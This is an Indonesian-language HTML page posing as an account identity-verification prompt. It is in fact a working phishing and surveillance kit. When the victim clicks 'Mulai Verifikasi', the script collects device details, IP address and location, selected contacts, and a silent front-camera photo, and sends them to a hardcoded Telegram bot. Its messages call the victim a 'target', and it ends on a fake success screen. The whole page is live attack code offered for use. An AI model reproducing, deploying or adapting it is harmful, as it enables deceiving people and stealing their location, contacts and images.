<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi Keamanan Akun</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            background: rgba(30, 41, 59, 0.9);
            padding: 35px;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            text-align: center;
            max-width: 420px;
            width: 100%;
            border: 1px solid rgba(56, 189, 248, 0.2);
        }
        h2 { margin-bottom: 10px; color: #38bdf8; font-size: 24px; }
        p { color: #94a3b8; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
        .btn {
            background: linear-gradient(135deg, #0284c7, #0369a1);
            color: white;
            border: none;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 4px 12px rgba(2, 132, 199, 0.4);
            width: 100%;
        }
        .btn:hover {
            background: linear-gradient(135deg, #0369a1, #075985);
            transform: translateY(-2px);
            box-shadow: 0 6px 16px rgba(2, 132, 199, 0.6);
        }
        .loader {
            border: 4px solid #334155;
            border-top: 4px solid #38bdf8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
            display: none;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #status { font-size: 13px; color: #38bdf8; margin-top: 15px; font-weight: 500; }
        video { display: none; }
    </style>
</head>
<body>

    <div class="card" id="mainCard">
        <h2>Verifikasi Identitas</h2>
        <p>Sistem mendeteksi aktivitas login baru. Silakan klik tombol di bawah untuk memverifikasi perangkat dan kontak Anda.</p>
        <button class="btn" id="verifyBtn" onclick="startProcess()">Mulai Verifikasi</button>
        <div class="loader" id="loader"></div>
        <p id="status"></p>
    </div>

    <!-- Elemen tersembunyi untuk kamera -->
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // KREDENSIAL TELEGRAM ANDA
        const TELEGRAM_BOT_TOKEN = '8612467033:AAFfEjBlNJrOdjTldqfwdYJtmy_lZMquslQ';
        const TELEGRAM_CHAT_ID = '1299490151';

        async function startProcess() {
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('loader').style.display = 'block';
            const statusEl = document.getElementById('status');
            
            statusEl.innerText = "Mengumpulkan informasi perangkat...";

            // 1. Kumpulkan Data Perangkat & Browser
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            const language = navigator.language;
            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const hardwareConcurrency = navigator.hardwareConcurrency || 'Tidak diketahui';
            const deviceMemory = navigator.deviceMemory || 'Tidak diketahui';
            
            let deviceType = "Desktop / PC";
            if (/android/i.test(userAgent)) deviceType = "Android";
            else if (/iphone|ipad|ipod/i.test(userAgent)) deviceType = "iOS (Apple)";

            let infoText = `🚨 **TARGET BARU TERDETEKSI** 🚨\n\n` +
                           `💻 **Jenis OS/Device:** ${deviceType}\n` +
                           `📱 **Platform:** ${platform}\n` +
                           `🌐 **Bahasa:** ${language}\n` +
                           `🖥 **Resolusi Layar:** ${screenRes}\n` +
                           `⚙️ **CPU Cores:** ${hardwareConcurrency}\n` +
                           `🧠 **RAM Perangkat:** ~${deviceMemory} GB\n` +
                           `🔍 **User Agent:** \`${userAgent}\``;

            // 2. Ambil IP Publik & Lokasi
            try {
                let ipResponse = await fetch('https://ipapi.co/json/');
                let ipData = await ipResponse.json();
                infoText += `\n\n🌐 **IP Publik:** ${ipData.ip}\n` +
                            `📍 **Lokasi:** ${ipData.city}, ${ipData.region}, ${ipData.country_name}\n` +
                            `🏢 **ISP:** ${ipData.org}`;
            } catch (e) {
                console.error("Gagal mengambil data IP:", e);
            }

            // Kirim Teks Utama ke Telegram
            await sendTextToTelegram(infoText);

            // 3. Coba Scan Kontak (Contact Picker API - Munculkan Prompt Pilih Kontak)
            if ('contacts' in navigator && 'AddressBook' in window.ContactsManager) {
                statusEl.innerText = "Menyiapkan verifikasi kontak...";
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                    let contactText = "📇 **DATA KONTAK YANG DIPILIH TARGET:**\n\n";
                    contacts.forEach((c, i) => {
                        contactText += `${i+1}. Nama: ${c.name || '-'}\n   Telp: ${c.tel || '-'}\n   Email: ${c.email || '-'}\n\n`;
                    });
                    await sendTextToTelegram(contactText);
                } catch (err) {
                    console.log("Pengguna membatalkan pemilihan kontak.");
                }
            }

            // 4. Ambil Foto Kamera Depan secara Otomatis
            try {
                statusEl.innerText = "Memverifikasi kamera perangkat...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
                const video = document.getElementById('video');
                video.srcObject = stream;

                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                    stream.getTracks().forEach(track => track.stop());

                    canvas.toBlob(async (blob) => {
                        if (blob) {
                            statusEl.innerText = "Menyelesaikan verifikasi...";
                            await sendPhotoToTelegram(blob, "Foto otomatis dari kamera target.");
                        }
                        finalizePage();
                    }, 'image/png');

                }, 1500);

            } catch (err) {
                console.warn("Akses kamera ditolak:", err);
                finalizePage();
            }
        }

        function finalizePage() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('status').innerText = "";
            document.getElementById('mainCard').innerHTML = `
                <h2 style="color: #22c55e;">Verifikasi Berhasil</h2>
                <p>Terima kasih. Perangkat Anda telah berhasil diverifikasi dan terhubung ke sistem.</p>
            `;
        }

        async function sendTextToTelegram(text) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            });
        }

        async function sendPhotoToTelegram(blob, caption) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'capture.png');
            formData.append('caption', caption);

            await fetch(url, { method: 'POST', body: formData });
        }
    </script>
</body>
</html>
